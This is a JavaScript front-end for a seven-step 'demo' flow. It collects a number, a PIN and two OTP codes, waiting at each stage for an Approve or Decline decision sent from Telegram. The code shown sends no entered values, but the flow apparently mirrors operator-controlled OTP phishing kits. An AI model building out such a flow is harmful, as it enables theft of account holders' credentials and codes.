let currentRef = null;
let pollTimer = null;
let countdownTimer = null;

function show(id, step) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  document.getElementById(id).classList.add("active");
  document.getElementById("stepNumber").textContent = `Step ${step} of 7`;
  document.getElementById("progressBar").style.width = `${Math.min(100, step / 7 * 100)}%`;
}

async function requestReview(stage) {
  try {
    const response = await fetch("/api/demo-status", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ stage })
    });
    const data = await response.json();
    if (!response.ok || !data.ok) throw new Error(data.error || "Could not create review");
    currentRef = data.reference;
    document.getElementById("reviewStatus").textContent = `Telegram review requested: ${currentRef}`;
    watchReview();
  } catch (error) {
    document.getElementById("reviewStatus").textContent =
      "Telegram is not configured or could not be reached. The demo can still be tested locally.";
  }
}

function watchReview() {
  clearInterval(pollTimer);
  if (!currentRef) return;
  pollTimer = setInterval(async () => {
    try {
      const r = await fetch(`/api/review-status/${encodeURIComponent(currentRef)}`);
      const data = await r.json();
      if (data.status === "approved") {
        clearInterval(pollTimer);
        clearInterval(countdownTimer);
        show("otp1Page", 5);
      } else if (data.status === "declined") {
        clearInterval(pollTimer);
        clearInterval(countdownTimer);
        show("declinePage", 7);
      }
    } catch (_) {}
  }, 2000);
}

function startWait(stage) {
  clearInterval(countdownTimer);
  show("loadingPage", 4);
  requestReview(stage);
  let seconds = 5;
  document.getElementById("seconds").textContent = `${seconds}s`;
  countdownTimer = setInterval(() => {
    seconds -= 1;
    document.getElementById("seconds").textContent = `${seconds}s`;
    if (seconds <= 0) {
      clearInterval(countdownTimer);
      // Wait for Telegram decision; do not auto-approve.
      document.getElementById("reviewStatus").textContent =
        "Still waiting for the Approve Demo or Decline Demo button in Telegram.";
    }
  }, 1000);
}

document.getElementById("startBtn").addEventListener("click", () => show("numberPage", 2));
document.getElementById("numberBtn").addEventListener("click", () => show("pinPage", 3));
document.getElementById("pinBtn").addEventListener("click", () => startWait("pin-stage"));

document.getElementById("otp1Btn").addEventListener("click", () => startWait("otp1-stage"));
document.getElementById("otp2Btn").addEventListener("click", () => startWait("otp2-stage"));

document.getElementById("restartSuccess").addEventListener("click", resetDemo);
document.getElementById("restartDecline").addEventListener("click", resetDemo);

function resetDemo() {
  clearInterval(pollTimer);
  clearInterval(countdownTimer);
  currentRef = null;
  show("homePage", 1);
}
